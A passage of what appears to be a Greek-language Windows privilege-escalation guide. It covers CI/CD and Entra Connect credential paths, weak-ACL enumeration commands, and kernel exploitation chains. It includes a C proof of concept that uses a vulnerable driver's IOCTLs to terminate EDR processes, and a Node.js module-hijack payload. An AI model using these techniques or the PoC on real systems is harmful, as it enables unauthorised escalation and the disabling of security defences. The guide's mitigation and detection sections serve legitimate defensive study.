Σε έναν Windows Jenkins controller, διακρίνετε το δικαίωμα δημιουργίας ή ρύθμισης μιας εργασίας από το δικαίωμα εκκίνησής της: [το Jenkins τα τεκμηριώνει ως ξεχωριστά δικαιώματα `Job/Create`, `Job/Configure` και `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ένα ρυθμισμένο χρονοδιάγραμμα ή ένα απομακρυσμένο trigger μπορεί να προσφέρει μια επιπλέον διαδρομή εκτέλεσης build, αλλά επιβεβαιώστε ότι είναι ενεργοποιημένο και ότι το build εκτελείται πράγματι. Η εκτέλεση γίνεται με την ταυτότητα του controller ή του επιλεγμένου agent, ενώ ένα αποθηκευμένο διαπιστευτήριο είναι αξιοποιήσιμο μόνο αν η εργασία έχει πρόσβαση στο αντίστοιχο scope. Ξεχωριστά, ελέγξτε την πρόσβαση στα metadata του `JENKINS_HOME`: το Jenkins αποθηκεύει υλικό διαπιστευτηρίων και κλειδιά κρυπτογράφησης στα `credentials.xml`, `secrets/hudson.util.Secret` και `secrets/master.key` ([αποθήκευση μυστικών του Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Η ύπαρξή τους από μόνη της δεν αποκαλύπτει κωδικό πρόσβασης· επιβεβαιώστε **την πρόσβαση ανάγνωσης στα απαιτούμενα αρχεία** και μια ξεχωριστή διαδρομή επαναχρησιμοποίησης λογαριασμού, χωρίς να εμφανίσετε μυστικά σε κοινόχρηστη έξοδο. Αν αυτός ο λογαριασμός έχει δικαίωμα εγγραφής στο `scriptPath` ενός αντικειμένου χρήστη AD, επιβεβαιώστε ότι η διαδρομή script είναι εγγράψιμη και ότι υπάρχει πραγματική διαδικασία σύνδεσης ή προγραμματισμένος καταναλωτής που εκτελείται ως ο χρήστης-στόχος, πριν το θεωρήσετε εκτέλεση μεταξύ χρηστών. Για οποιονδήποτε περαιτέρω έλεγχο ομάδας απαιτείται ξεχωριστή επιβεβαίωση των πραγματικών δικαιωμάτων AD.

#### Ταυτότητα self-hosted agent του Azure Pipelines

Για ένα έργο Azure DevOps Server ή Azure Pipelines, διακρίνετε το δικαίωμα **δημιουργίας ή επεξεργασίας** ενός pipeline από το δικαίωμα **θέσης του σε ουρά** και χρήσης του επιλεγμένου agent pool· η [Microsoft τεκμηριώνει ξεχωριστά τα δικαιώματα pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) και την [εξουσιοδότηση pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Αν ένας λογαριασμός με χαμηλότερα δικαιώματα μπορεί να υποβάλει ένα βήμα script και να εκτελέσει αυτό το pipeline σε self-hosted Windows agent, το βήμα εκτελείται ως ο [λογαριασμός λειτουργικού συστήματος που έχει ρυθμιστεί για τον agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Επιβεβαιώστε το ακριβές pipeline, τους περιορισμούς κλάδων και πόρων, το εξουσιοδοτημένο pool, την εκτελέσιμη εργασία και την ταυτότητα της υπηρεσίας agent πριν ισχυριστείτε ότι υπάρχει μετάβαση μεταξύ χρηστών ή σε SYSTEM. Ένας εγκατεστημένος agent, ένας ρόλος έργου ή δικαίωμα εγγραφής στο repository αποτελούν απλώς ενδείξεις· ελέγξτε τα δικαιώματα και τα τοπικά metadata της υπηρεσίας χωρίς να εκκινήσετε build κατά την παθητική απαρίθμηση.

#### Διαπιστευτήρια Microsoft Entra Connect Sync

Η [Microsoft διακρίνει](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) τον **λογαριασμό υπηρεσίας ADSync**, ο οποίος εκτελεί την υπηρεσία συγχρονισμού και προσπελαύνει τη βάση δεδομένων SQL, από τον **λογαριασμό σύνδεσης AD DS**, τα δικαιώματα καταλόγου του οποίου εξαρτώνται από τις ρυθμισμένες δυνατότητες συγχρονισμού. Τα διαπιστευτήρια σύνδεσης αποθηκεύονται κρυπτογραφημένα σε αυτήν τη βάση δεδομένων, ενώ το υλικό κλειδιού [προστατεύεται από το DPAPI στο πλαίσιο του λογαριασμού υπηρεσίας ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Μια εγκατεστημένη υπηρεσία συγχρονισμού, μια ομάδα με όνομα που υποδηλώνει τοπικά δικαιώματα διαχειριστή ή η απλή δυνατότητα πρόσβασης στη βάση δεδομένων δεν αποδεικνύουν από μόνα τους ότι υπάρχει αποκρυπτογραφήσιμο διαπιστευτήριο ή δυνατότητα κλιμάκωσης σε δικαιώματα τομέα. Ελέγξτε ξεχωριστά τα πραγματικά δικαιώματα ανάγνωσης της βάσης δεδομένων, την πρόσβαση στον λογαριασμό υπηρεσίας και στο κλειδί, τη διάταξη εγκατάστασης και SQL, την ταυτότητα σύνδεσης που έχει ρυθμιστεί και τα αποτελεσματικά δικαιώματα AD αυτής της ταυτότητας. Η συνήθης απαρίθμηση πρέπει να εμφανίζει μόνο metadata υπηρεσίας και πρόσβασης, όχι να αναζητά ή να εμφανίζει τα αποθηκευμένα μυστικά.

#### Δικαιώματα DLL υποστήριξης προγραμμάτων οδήγησης εκτυπωτή

Ένα εγκατεστημένο πρόγραμμα οδήγησης εκτυπωτή ενδέχεται να διατηρεί DLL υποστήριξης στο `C:\ProgramData` και να τα φορτώνει σε μια διεργασία εκτύπωσης με αυξημένα δικαιώματα. Ελέγξτε τα ACL του ακριβούς καταλόγου του προγράμματος οδήγησης και των DLL, συμπεριλαμβανομένων των γονικών καταλόγων και των reparse points, ακόμη κι αν δεν επιτρέπεται η απαρίθμηση μέσω printer WMI. Για το [ζήτημα CVE-2019-19363 του προγράμματος οδήγησης εκτυπωτή Ricoh](https://www.ricoh.com/info/2020/0122_1), η αναφερόμενη διαδρομή ήταν `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`· η [αρχική αποκάλυψη](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) περιγράφει τη φόρτωση DLL από το `PrintIsolationHost.exe`. Ένα ACL που επιτρέπει εγγραφή είναι απλώς μια ένδειξη: επιβεβαιώστε την πραγματική δυνατότητα εγγραφής μετά την εφαρμογή των καταχωρίσεων άρνησης, ότι το σχετικό πρόγραμμα οδήγησης είναι εγκατεστημένο και φορτώνει το αρχείο με ταυτότητα αυξημένων δικαιωμάτων, καθώς και αν ο ενημερωμένος driver ή το πρόγραμμα ασφάλειας του προμηθευτή έχει διορθώσει την εγκατάσταση. Μη συμπεραίνετε ότι υπάρχει ευπάθεια μόνο από το όνομα του καταλόγου ή την έκδοση του προγράμματος οδήγησης.

### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από λογαριασμό Administrator (schedtasks).

Ένας τρόπος εντοπισμού αδύναμων δικαιωμάτων σε φακέλους/αρχεία του συστήματος είναι ο εξής:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/εκτέλεση μέσω αυτόματης φόρτωσης plugin του Notepad++

Το Notepad++ φορτώνει αυτόματα κάθε DLL plugin στους υποφακέλους `plugins`. Αν υπάρχει εγκατάσταση portable ή αντίγραφο με δυνατότητα εγγραφής, η προσθήκη ενός κακόβουλου plugin επιτρέπει την αυτόματη εκτέλεση κώδικα μέσα στο `notepad++.exe` σε κάθε εκκίνηση (και από το `DllMain` και από callbacks του plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποια καταχώριση μητρώου ή κάποιο δυαδικό αρχείο που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **ακόλουθη σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **θέσεις autoruns για κλιμάκωση προνομίων**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **περίεργους/ευάλωτους drivers τρίτων κατασκευαστών**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Αν ένας driver εκθέτει ένα primitive αυθαίρετης ανάγνωσης/εγγραφής στον kernel (συνηθισμένο σε κακοσχεδιασμένους IOCTL handlers), μπορείτε να κλιμακώσετε τα προνόμιά σας κλέβοντας απευθείας ένα SYSTEM token από τη μνήμη του kernel.<sup>[[13]](#references)</sup> Δείτε την τεχνική βήμα προς βήμα εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Σχετικό υλικό για Windows kernel exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Για σφάλματα race condition όπου η ευάλωτη κλήση ανοίγει μια διαδρομή Object Manager ελεγχόμενη από τον επιτιθέμενο, η σκόπιμη επιβράδυνση της αναζήτησης (με components μέγιστου μήκους ή βαθιές αλυσίδες καταλόγων) μπορεί να παρατείνει το χρονικό περιθώριο από μικροδευτερόλεπτα σε δεκάδες μικροδευτερόλεπτα:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF σε cancel-safe queue, διαρροές paged-pool και pivots μέσω I/O ring

Ορισμένες αλυσίδες LPE στον Windows kernel μπορούν να δημιουργηθούν από δύο μεμονωμένα ασθενή σφάλματα: ένα **race condition στον κύκλο ζωής μιας cancel-safe queue** που απελευθερώνει ένα request/CBD ενώ το lock της queue παραμένει κλειδωμένο, και μια διαρροή **lock-release-before-copy** που διαρρέει μια απελευθερωμένη εκχώρηση paged-pool κατά τη διάρκεια του `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Σημειώσεις ελέγχου και exploitation:

- **Απελευθέρωση υπό lock + ακύρωση μετά**: αναζητήστε μια διαδρομή επιτυχίας που εκτελεί **Acquire -> CompleteRequest/free -> Release**, ενώ η διαδρομή ακύρωσης εκτελεί **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Αν η διαδρομή επιτυχίας φτάσει στα `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` πριν από την απελευθέρωση του lock CBDQ/CSQ, ένα thread που έχει μπλοκάρει στο `NtCancelIoFileEx -> IopCsqCancelRoutine` μπορεί να συνεχίσει αργότερα και να περάσει ένα απελευθερωμένο `PFLT_CALLBACK_DATA` πίσω στο callback αφαίρεσης του driver.
- **Ανακτήστε το απελευθερωμένο αντικείμενο queue** με μια εκχώρηση paged-pool ίδιου μεγέθους, ελεγχόμενη από τον επιτιθέμενο. Τα `NPFS` Data Queue Entries είναι χρήσιμα, επειδή το payload και το μέγεθός τους είναι ελεγχόμενα και μπορείτε αργότερα να τα εξετάσετε με λειτουργίες ανάγνωσης/peek pipe. Αν το απελευθερωμένο αντικείμενο περιέχει συνδέσμους λίστας, αντικαταστήστε τους με μια **κυκλική λίστα από πλαστά request nodes στη μνήμη user-mode**, ώστε ο driver να επεξεργάζεται επανειλημμένα δομές request που ορίζει ο επιτιθέμενος, αντί να τερματίζει στην αρχική κεφαλή της λίστας.
- **Αναβαθμίστε μια προβλέψιμη εγγραφή**: αν το πλαστό request ανακατευθύνει έναν nested context pointer που χρησιμοποιείται από εγγραφές bookkeeping (timestamps / QPC / πεδία δίπλα στο refcount), ενδέχεται να αποκτήσετε εγγραφή στον kernel με **ελεγχόμενη διεύθυνση αλλά όχι ελεγχόμενη τιμή**. Σε αυτή την περίπτωση, στοχεύστε το πεδίο **μήκους/μεγέθους** ενός αντικειμένου pool που έχει γίνει spray, αντί για έναν τελικό δείκτη κώδικα/δεδομένων, και στη συνέχεια απαριθμήστε τα αντικείμενα του spray μέχρι το αλλοιωμένο αντικείμενο να επιτρέψει μια **out-of-bounds ανάγνωση paged-pool**.
- **Μοτίβο διαρροής ευάλωτο σε race**: κάθε syscall που εκτελεί `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` είναι ισχυρός υποψήφιος. Η αξιοπιστία βελτιώνεται όταν ο επιτιθέμενος μπορεί να αυξήσει το μέγεθος του buffer που αντιγράφεται (για παράδειγμα, προσθέτοντας πολλές εγγραφές λίστας/resource που αυξάνουν το τελικό μέγεθος εκχώρησης ενός serializer), επειδή η μεγαλύτερη αντιγραφή διευρύνει το χρονικό περιθώριο αντικατάστασης χωρίς απαραίτητα να προκαλέσει crash στο σύστημα.
- **Στόχοι refill με πολλούς pointers**: οι πίνακες registered-buffer του Windows **I/O ring** είναι εξαιρετικοί στόχοι διαρροής, επειδή το μέγεθος paged-pool τους ελέγχεται από τον επιτιθέμενο (`8 * regBufferCnt`) και κάθε στοιχείο είναι ένας pointer του kernel προς ένα `_IOP_MC_BUFFER_ENTRY`. Διαρρεύστε έναν από αυτούς τους πίνακες, ανακτήστε το περιβάλλον `IORING_OBJECT` και, στη συνέχεια, αλλοιώστε τα **`RegBuffers`** και **`RegBuffersCount`**, ώστε οι επόμενες λειτουργίες I/O ring να χρησιμοποιούν πλαστές εγγραφές που έχει κατασκευάσει ο επιτιθέμενος και να παρέχουν αυθαίρετη ανάγνωση/εγγραφή στον kernel. Αν η μόνη διαθέσιμη εγγραφή σάς δίνει ένα σταθερό byte (για παράδειγμα από το `KUSER_SHARED_DATA+0x14`), χρησιμοποιήστε **επικαλυπτόμενες μη ευθυγραμμισμένες εγγραφές** για να δημιουργήσετε έναν user pointer με επαναλαμβανόμενα bytes, όπως `0x0101010101010101`, αντιστοιχίστε τον με `VirtualAlloc` και τοποθετήστε εκεί τον πλαστό πίνακα registered-buffer.<sup>[[30]](#references)</sup>

Χρήσιμες ενδείξεις για debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Μόλις αποκτήσετε αυθαίρετο read/write στο kernel μέσω του αλλοιωμένου I/O ring, κλέψτε ένα SYSTEM token ακολουθώντας την τυπική post-primitive διαδικασία:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives αλλοίωσης μνήμης του Registry hive

Οι σύγχρονες ευπάθειες hive επιτρέπουν να διαμορφώσετε ντετερμινιστικές διατάξεις, να εκμεταλλευτείτε εγγράψιμους απογόνους των HKLM/HKU και να μετατρέψετε την αλλοίωση metadata σε υπερχειλίσεις του kernel paged-pool χωρίς custom driver. Μάθετε όλη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion σε direct mode του `RtlQueryRegistryValues` μέσω paths που ελέγχει ο επιτιθέμενος

Ορισμένοι drivers δέχονται ένα registry path από το userland, ελέγχουν μόνο ότι είναι μια έγκυρη συμβολοσειρά UTF-16 και έπειτα καλούν `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` με `RTL_QUERY_REGISTRY_DIRECT` σε ένα scalar της στοίβας, όπως το `int readValue`. Αν λείπει το `RTL_QUERY_REGISTRY_TYPECHECK`, το `EntryContext` ερμηνεύεται με βάση τον **πραγματικό** τύπο του Registry και όχι τον τύπο που ανέμενε ο developer.

Αυτό δημιουργεί δύο χρήσιμα primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ένα απόλυτο path `\Registry\...` που ελέγχεται από τον χρήστη επιτρέπει στον driver να κάνει query σε keys που επιλέγει ο επιτιθέμενος, να κάνει leak την ύπαρξή τους μέσω return codes/logs και, μερικές φορές, να διαβάζει τιμές στις οποίες ο caller δεν θα είχε άμεση πρόσβαση.
- **Αλλοίωση μνήμης kernel**: ένας προορισμός scalar, όπως το `&readValue`, μπορεί να υποστεί type confusion ως `REG_QWORD`, `UNICODE_STRING` ή buffer δυαδικών δεδομένων συγκεκριμένου μεγέθους, ανάλογα με τον τύπο της τιμής Registry.

Σημειώσεις για πρακτική εκμετάλλευση:

- **Mitigation από τα Windows 8 και μετά**: αν το query αφορά ένα **untrusted hive** με `RTL_QUERY_REGISTRY_DIRECT`, αλλά χωρίς `RTL_QUERY_REGISTRY_TYPECHECK`, οι κλήσεις από το kernel καταλήγουν σε crash με `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Για να διατηρήσετε τη δυνατότητα εκμετάλλευσης, αναζητήστε **keys που μπορεί να γράψει ο επιτιθέμενος μέσα σε trusted system hives**, αντί να τοποθετείτε τιμές στο `HKCU`.
- **Staging σε trusted hive**: χρησιμοποιήστε το NtObjectManager για να απαριθμήσετε εγγράψιμους απογόνους του `\Registry\Machine` και επαναλάβετε τη σάρωση με ένα duplicated token **low-integrity**, ώστε να εντοπίσετε keys στα οποία υπάρχει πρόσβαση από sandboxed contexts:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: μια απευθείας εγγραφή 8 byte σε ένα `int` 4 byte καταστρέφει γειτονικά δεδομένα της στοίβας και μπορεί να αντικαταστήσει μερικώς έναν κοντινό δείκτη callback/function.
- **`REG_SZ` / `REG_EXPAND_SZ`**: η direct λειτουργία αναμένει το `EntryContext` να δείχνει σε ένα `UNICODE_STRING`. Αν ο κώδικας φορτώσει πρώτα ένα `REG_DWORD` που ελέγχει ο attacker σε μια scalar μεταβλητή της στοίβας και μετά επαναχρησιμοποιήσει το ίδιο buffer για ανάγνωση string, ο attacker ελέγχει τα `Length`/`MaximumLength` και επηρεάζει μερικώς τον δείκτη `Buffer`, προκαλώντας μια ημι-ελεγχόμενη εγγραφή στον kernel.
- **`REG_BINARY`**: για μεγάλα binary δεδομένα, η direct λειτουργία αντιμετωπίζει το πρώτο `LONG` στο `EntryContext` ως signed μέγεθος buffer. Αν μια προηγούμενη ανάγνωση `REG_DWORD` αφήσει μια **αρνητική** τιμή που ελέγχει ο attacker στην επαναχρησιμοποιημένη scalar μεταβλητή, το επόμενο query `REG_BINARY` αντιγράφει τα bytes του attacker απευθείας σε γειτονικές θέσεις της στοίβας, κάτι που συχνά αποτελεί τον πιο απλό τρόπο για πλήρη αντικατάσταση ενός callback pointer.

Ισχυρό μοτίβο αναζήτησης: **ετερογενείς αναγνώσεις registry στην ίδια μεταβλητή της στοίβας, χωρίς επανεκκίνηση της τιμής της**. Κάντε grep για `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, επαναχρησιμοποιούμενους δείκτες `EntryContext` και διαδρομές κώδικα όπου η πρώτη ανάγνωση registry καθορίζει αν θα πραγματοποιηθεί δεύτερη ανάγνωση.

#### Κατάχρηση της απουσίας του FILE_DEVICE_SECURE_OPEN σε device objects (LPE + EDR kill)

Ορισμένοι signed drivers τρίτων δημιουργούν το device object τους με ισχυρό SDDL μέσω του IoCreateDeviceSecure, αλλά παραλείπουν να ορίσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτό το flag, το secure DACL δεν εφαρμόζεται όταν γίνεται άνοιγμα της συσκευής μέσω διαδρομής που περιέχει ένα επιπλέον component, επιτρέποντας σε οποιονδήποτε μη προνομιούχο χρήστη να αποκτήσει handle χρησιμοποιώντας μια διαδρομή namespace όπως:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματική περίπτωση)

Μόλις ένας χρήστης μπορέσει να ανοίξει τη συσκευή, μπορεί να καταχραστεί τα προνομιούχα IOCTL που εκθέτει ο driver για LPE και tampering. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στην πράξη:
- Επιστροφή handles πλήρους πρόσβασης σε αυθαίρετες διεργασίες (κλοπή token / SYSTEM shell μέσω DuplicateTokenEx/CreateProcessAsUser).
- Απεριόριστη raw ανάγνωση/εγγραφή δίσκου (tampering εκτός σύνδεσης, τεχνάσματα persistence κατά την εκκίνηση).
- Τερματισμός αυθαίρετων διεργασιών, συμπεριλαμβανομένων των Protected Process/Light (PP/PPL), επιτρέποντας την εξουδετέρωση AV/EDR από το userland μέσω του kernel.

Ελάχιστο μοτίβο PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Μετριασμοί για developers
- Ορίζετε πάντα το FILE_DEVICE_SECURE_OPEN κατά τη δημιουργία αντικειμένων συσκευής που προορίζονται να περιορίζονται μέσω DACL.
- Επικυρώνετε το πλαίσιο του καλούντος για προνομιακές λειτουργίες. Προσθέτετε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασιών ή την επιστροφή handles.
- Περιορίζετε τα IOCTL (μάσκες πρόσβασης, METHOD_*, επικύρωση εισόδου) και εξετάζετε μοντέλα μέσω broker αντί για άμεσα προνόμια kernel.

Ιδέες ανίχνευσης για defenders
- Παρακολουθείτε ανοίγματα ύποπτων ονομάτων συσκευών από user mode (π.χ., \\ .\\amsdk*) και συγκεκριμένες ακολουθίες IOCTL που υποδηλώνουν κατάχρηση.
- Επιβάλλετε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (HVCI/WDAC/Smart App Control) και διατηρείτε τις δικές σας λίστες allow/deny.


## PATH DLL Hijacking

Αν έχετε **δικαιώματα εγγραφής σε έναν φάκελο που βρίσκεται στο PATH**, ενδέχεται να μπορέσετε να κάνετε hijack μια DLL που φορτώνεται από μια διεργασία και να **κλιμακώσετε προνόμια**.<sup>[[2]](#references)</sup>

Ελέγξτε τα δικαιώματα όλων των φακέλων που περιλαμβάνονται στο PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Για περισσότερες πληροφορίες σχετικά με τον τρόπο κατάχρησης αυτού του ελέγχου:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Υποκλοπή επίλυσης μονάδων Node.js / Electron μέσω `C:\node_modules`

Πρόκειται για μια παραλλαγή **Windows uncontrolled search path** που επηρεάζει εφαρμογές **Node.js** και **Electron** όταν εκτελούν ένα bare import, όπως `require("foo")`, και η αναμενόμενη μονάδα **λείπει**.<sup>[[20]](#references)</sup>

Το Node αναζητά πακέτα ανεβαίνοντας στην ιεραρχία καταλόγων και ελέγχοντας τους φακέλους `node_modules` σε κάθε γονικό κατάλογο. Στα Windows, η αναζήτηση μπορεί να φτάσει στη ρίζα της μονάδας δίσκου, επομένως μια εφαρμογή που εκκινείται από το `C:\Users\Administrator\project\app.js` ενδέχεται να ελέγξει τις εξής διαδρομές:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **χρήστης με χαμηλά δικαιώματα** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει ένα κακόβουλο `foo.js` (ή έναν φάκελο πακέτου) και να περιμένει να επιλυθεί η εξάρτηση που λείπει από μια διεργασία **Node/Electron με υψηλότερα δικαιώματα**. Το payload εκτελείται στο περιβάλλον ασφαλείας της διεργασίας-θύματος, επομένως αυτό οδηγεί σε **LPE** όταν ο στόχος εκτελείται ως administrator, από μια προγραμματισμένη εργασία με αυξημένα δικαιώματα/ένα service wrapper ή από μια εφαρμογή επιφάνειας εργασίας με αυξημένα δικαιώματα που ξεκινά αυτόματα.

Αυτό συμβαίνει ιδιαίτερα συχνά όταν:

- μια εξάρτηση δηλώνεται στο `optionalDependencies`<sup>[[22]](#references)</sup>
- μια βιβλιοθήκη τρίτου μέρους τυλίγει το `require("foo")` σε `try/catch` και συνεχίζει σε περίπτωση αποτυχίας
- ένα πακέτο αφαιρέθηκε από τα production builds, παραλείφθηκε κατά τη συσκευασία ή απέτυχε να εγκατασταθεί
- το ευάλωτο `require()` βρίσκεται βαθιά μέσα στο δέντρο εξαρτήσεων και όχι στον κύριο κώδικα της εφαρμογής

### Εντοπισμός ευάλωτων στόχων

Χρησιμοποιήστε το **Procmon** για να επιβεβαιώσετε τη διαδρομή επίλυσης:<sup>[[23]](#references)</sup>

- Φιλτράρετε με `Process Name` = το εκτελέσιμο αρχείο-στόχο (`node.exe`, το EXE της εφαρμογής Electron ή η διεργασία wrapper)
- Φιλτράρετε με `Path` `contains` `node_modules`
- Εστιάστε στα `NAME NOT FOUND` και στο τελικό επιτυχές άνοιγμα κάτω από το `C:\node_modules`

Χρήσιμα μοτίβα για έλεγχο κώδικα σε αποσυσκευασμένα αρχεία `.asar` ή στον πηγαίο κώδικα της εφαρμογής:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Εντοπίστε το **όνομα του πακέτου που λείπει** από το Procmon ή από την εξέταση του πηγαίου κώδικα.
2. Δημιουργήστε τον root κατάλογο αναζήτησης, αν δεν υπάρχει ήδη:

```powershell
mkdir C:\node_modules
```

3. Τοποθετήστε ένα module με το ακριβώς αναμενόμενο όνομα:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Ενεργοποιήστε την εφαρμογή-θύμα. Αν η εφαρμογή επιχειρήσει `require("foo")` και η νόμιμη ενότητα απουσιάζει, το Node μπορεί να φορτώσει το `C:\node_modules\foo.js`.

Παραδείγματα από τον πραγματικό κόσμο για προαιρετικές ενότητες που λείπουν και ταιριάζουν σε αυτό το μοτίβο είναι τα `bluebird` και `utf-8-validate`, αλλά το **technique** είναι το επαναχρησιμοποιήσιμο στοιχείο: εντοπίστε οποιοδήποτε **bare import** λείπει και το οποίο θα επιλύσει μια προνομιούχα διεργασία Windows Node/Electron.

### Ιδέες για εντοπισμό και hardening

- Ειδοποιήστε όταν ένας χρήστης δημιουργεί το `C:\node_modules` ή γράφει εκεί νέα αρχεία/πακέτα `.js`.
- Αναζητήστε διεργασίες υψηλής ακεραιότητας που διαβάζουν από το `C:\node_modules\*`.
- Συμπεριλάβετε όλες τις εξαρτήσεις χρόνου εκτέλεσης στα πακέτα παραγωγής και ελέγξτε τη χρήση του `optionalDependencies`.
- Ελέγξτε τον κώδικα τρίτων για μοτίβα `try { require("...") } catch {}` που αποτυγχάνουν σιωπηρά.
- Απενεργοποιήστε τους προαιρετικούς ελέγχους όταν το υποστηρίζει η βιβλιοθήκη (για παράδειγμα, ορισμένες εγκαταστάσεις `ws` μπορούν να παραλείψουν τον έλεγχο για το legacy `utf-8-validate` με τη ρύθμιση `WS_NO_UTF_8_VALIDATE=1`).

## Δίκτυο

### Κοινόχρηστοι πόροι

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### αρχείο hosts

Ελέγξτε αν υπάρχουν άλλοι γνωστοί υπολογιστές καταχωρισμένοι στατικά στο αρχείο hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Διεπαφές δικτύου & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Ανοιχτές θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από έξω.

```bash
netstat -ano #Opened ports?
```

